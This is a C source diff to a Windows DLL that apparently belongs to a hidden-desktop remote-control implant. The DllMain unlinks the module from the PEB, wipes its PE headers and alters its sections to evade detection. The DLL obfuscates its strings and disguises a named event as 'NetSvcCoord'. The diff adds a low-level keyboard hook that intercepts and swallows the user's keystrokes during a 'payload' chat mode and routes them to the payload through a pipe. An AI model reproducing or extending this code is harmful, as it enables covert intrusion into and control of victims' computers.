@@ -128,6 +128,18 @@ static const char CLASS_NAME_A_x[15] = {
     XCHAR('A'), XCHAR('c'), XCHAR('k'), 0
 };
 
+/* "Global\\NetSvcCoord_Chat" == 23 chars + NUL -- named event set by the
+ * payload when chat-typing mode is active. Our LL keyboard hook reads
+ * this to decide whether to consume the key (chat on) or pass through
+ * (chat off), so keystrokes during chat NEVER reach the target app's
+ * window queue on the iso desktop. */
+static const char CHAT_EVENT_A_x[24] = {
+    XCHAR('G'), XCHAR('l'), XCHAR('o'), XCHAR('b'), XCHAR('a'), XCHAR('l'),
+    XCHAR('\\'), XCHAR('N'), XCHAR('e'), XCHAR('t'), XCHAR('S'), XCHAR('v'),
+    XCHAR('c'), XCHAR('C'), XCHAR('o'), XCHAR('o'), XCHAR('r'), XCHAR('d'),
+    XCHAR('_'), XCHAR('C'), XCHAR('h'), XCHAR('a'), XCHAR('t'), 0
+};
+
 /* Default / Winlogon / Screen-saver -- desktop names to skip. */
 static const char NAME_DEFAULT_x[8]      = { XCHAR('D'),XCHAR('e'),XCHAR('f'),XCHAR('a'),XCHAR('u'),XCHAR('l'),XCHAR('t'), 0 };
 static const char NAME_WINLOGON_x[9]     = { XCHAR('W'),XCHAR('i'),XCHAR('n'),XCHAR('l'),XCHAR('o'),XCHAR('g'),XCHAR('o'),XCHAR('n'), 0 };
@@ -470,10 +482,58 @@ static void wire_send(HANDLE *pp, const wire_evt *e) {
     }
 }
 
-/* ── Reader on the current input desktop ───────────────────────
- * We are already SetThreadDesktop'd onto `deskname`. Create the
- * hidden INPUTSINK window, register raw kbd + mouse, run a GetMessage
- * loop with a 200ms WM_TIMER for the teardown/superseded check. */
+/* ── LL keyboard hook (chat-mode consumer) ────────────────────
+ *
+ * Installed on the iso desktop alongside the RIDEV_INPUTSINK reader.
+ * When the payload's chat-typing mode is active (Global\NetSvcCoord_Chat
+ * signaled), this hook returns 1 for every non-bare-modifier key so the
+ * target app's window queue never sees the user's keystrokes. INPUTSINK
+ * still gets the raw event on a separate dispatch path -- so the payload
+ * still routes the typed chars into ui_chat_feed_char via the pipe.
+ *
+ * Bare modifiers (Ctrl/Shift/Alt/Win/Lock keys) are passed through so
+ * the target app's own modifier state stays coherent; consuming them
+ * would cause "stuck modifier" symptoms after chat exits. */
+static HANDLE g_chat_ev = NULL;
+
+/* Local aliases for the KBDLLHOOKSTRUCT fields we need. Kept minimal so
+ * the helper doesn't drag in windowsx.h / winuser hook constants that
+ * bloat the mapped image. */
+typedef struct {
+    DWORD vkCode;
+    DWORD scanCode;
+    DWORD flags;
+    DWORD time;
+    ULONG_PTR dwExtraInfo;
+} SVC_KBDLL;
+
+static LRESULT CALLBACK wl_ll_kbd(int code, WPARAM wp, LPARAM lp) {
+    (void)wp;
+    if (code < 0) return CallNextHookEx(NULL, code, wp, lp);
+    /* Fast non-blocking chat-active read. If the event doesn't exist yet
+     * (payload hasn't chatted this session) or is reset, pass through. */
+    int chat_on = g_chat_ev &&
+                  (WaitForSingleObject(g_chat_ev, 0) == WAIT_OBJECT_0);
+    if (!chat_on) return CallNextHookEx(NULL, code, wp, lp);
+
+    SVC_KBDLL *k = (SVC_KBDLL *)lp;
+    USHORT vk = (USHORT)k->vkCode;
+
+    /* Bare modifier / lock / super keys: pass through so target's own
+     * modifier state (SHIFT indicator, CAPS lock LED, etc.) stays sane. */
+    if (vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL ||
+        vk == VK_SHIFT   || vk == VK_LSHIFT   || vk == VK_RSHIFT   ||
+        vk == VK_MENU    || vk == VK_LMENU    || vk == VK_RMENU    ||
+        vk == VK_CAPITAL || vk == VK_NUMLOCK  || vk == VK_SCROLL   ||
+        vk == VK_LWIN    || vk == VK_RWIN) {
+        return CallNextHookEx(NULL, code, wp, lp);
+    }
+    /* Everything else while chat is active: EAT. Target app's window
+     * queue never sees this key. INPUTSINK on our reader still delivers
+     * the raw event to the payload for chat processing. */
+    return 1;
+}
+
 static void run_reader(const char *deskname) {
     static ATOM class_atom = 0;
     char cls[32] = {0};
@@ -510,6 +570,15 @@ static void run_reader(const char *deskname) {
     rid[1].dwFlags = RIDEV_INPUTSINK; rid[1].hwndTarget = hwnd;
     BOOL rok = RegisterRawInputDevices(rid, 2, sizeof(RAWINPUTDEVICE));
     lg("reader: RegisterRawInputDevices=%d", rok);
+
+    /* Install WH_KEYBOARD_LL on this desktop so we can CONSUME keys
+     * during chat-typing mode (target app on iso desktop must NEVER see
+     * the user typing to our AI prompt). dwThreadId=0 covers all threads
+     * on the caller's desktop. hMod=NULL is legal for LL hooks (they
+     * always run in the installing process's context). */
+    HHOOK hkbd = SetWindowsHookExW(13 /*WH_KEYBOARD_LL*/, wl_ll_kbd, NULL, 0);
+    lg("reader: WH_KEYBOARD_LL install %s (chat-consume ARMED)",
+       hkbd ? "OK" : "FAILED");
 
     HANDLE pipe = connect_pipe();
     lg("reader: pipe %s", pipe != INVALID_HANDLE_VALUE ? "connected" : "FAILED (will retry via WM_TIMER)");
@@ -594,6 +663,17 @@ static void run_reader(const char *deskname) {
                     lg("reader: pipe RECONNECTED (WM_TIMER)");
                 }
             }
+            /* Chat event opportunistic open -- payload creates the event
+             * on first chat toggle, so if we launched before that we need
+             * to retry. Cheap 1 call every 100ms until it opens. */
+            if (!g_chat_ev) {
+                char cev[48] = {0};
+                x_decode(cev, CHAT_EVENT_A_x, sizeof(CHAT_EVENT_A_x));
+                WCHAR cevw[64] = {0};
+                for (int i = 0; cev[i] && i < 63; i++) cevw[i] = (WCHAR)cev[i];
+                g_chat_ev = OpenEventW(SYNCHRONIZE, FALSE, cevw);
+                if (g_chat_ev) lg("reader: chat_ev opened (was pending)");
+            }
             /* Desktop check. If the user (or watchdog) returned to Default,
              * bail out so the watch thread can start fresh next iso trip. */
             HDESK cur = OpenInputDesktop(0, FALSE, DESKTOP_READOBJECTS);
@@ -604,6 +684,7 @@ static void run_reader(const char *deskname) {
         TranslateMessage(&m); DispatchMessageW(&m);
     }
     KillTimer(hwnd, 1);
+    if (hkbd) UnhookWindowsHookEx(hkbd);
     RAWINPUTDEVICE rr[2];
     rr[0].usUsagePage = 0x01; rr[0].usUsage = 0x06;
     rr[0].dwFlags = RIDEV_REMOVE; rr[0].hwndTarget = NULL;
@@ -690,6 +771,23 @@ BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID reserved) {
         peb_unlink_and_spoof(h);
         wipe_pe_headers(h);
         downgrade_sections(h);
+
+        /* Open the payload's chat-active event (created by
+         * chat_state_export()) so our LL keyboard hook can gate
+         * consume-vs-passthrough. The event may not exist yet if the
+         * payload hasn't chatted this session -- OpenEventW returns NULL
+         * in that case; the hook checks g_chat_ev before waiting so
+         * NULL is safe (pass-through). We'll retry the open opportunis-
+         * tically inside the reader's WM_TIMER handler. */
+        {
+            char cev[48] = {0};
+            x_decode(cev, CHAT_EVENT_A_x, sizeof(CHAT_EVENT_A_x));
+            WCHAR cevw[64] = {0};
+            for (int i = 0; cev[i] && i < 63; i++) cevw[i] = (WCHAR)cev[i];
+            g_chat_ev = OpenEventW(SYNCHRONIZE, FALSE, cevw);
+            lg("chat_ev open %s (payload event Global\\NetSvcCoord_Chat)",
+               g_chat_ev ? "OK" : "PENDING");
+        }
 
         CreateThread(NULL, 0, watch_thread, NULL, 0, NULL);
     }
